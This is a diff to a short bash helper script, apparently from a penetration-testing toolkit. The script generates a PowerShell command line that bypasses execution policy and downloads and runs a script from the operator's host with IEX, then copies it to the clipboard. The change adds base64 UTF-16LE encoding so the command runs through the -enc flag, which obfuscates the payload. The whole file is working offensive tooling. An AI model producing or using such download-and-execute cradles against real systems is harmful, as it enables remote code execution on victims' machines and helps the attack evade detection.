@@ -1,9 +1,10 @@
 #!/bin/bash
 if [ $# -eq 0 ]; then
-    echo "Usage: Power_Shell_Dwn_Exec_64 [port to download from] [file name to download]"
+    echo "Usage: Enc_Power_Shell_Dwn_Exec_64 [port to download from] [file name to download]"
     exit 1
 fi
 IP=$( IP_No_Clip );                      
 New_IP=$( echo -n $IP );                                                                                                              
-echo "C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\"";
-echo "C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\"" | clip;
+Encoded=$( echo "IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')" | iconv -t UTF-16LE | base64 -w0 );
+echo "C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -enc $Encoded";
+echo "C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -enc $Encoded" | clip;
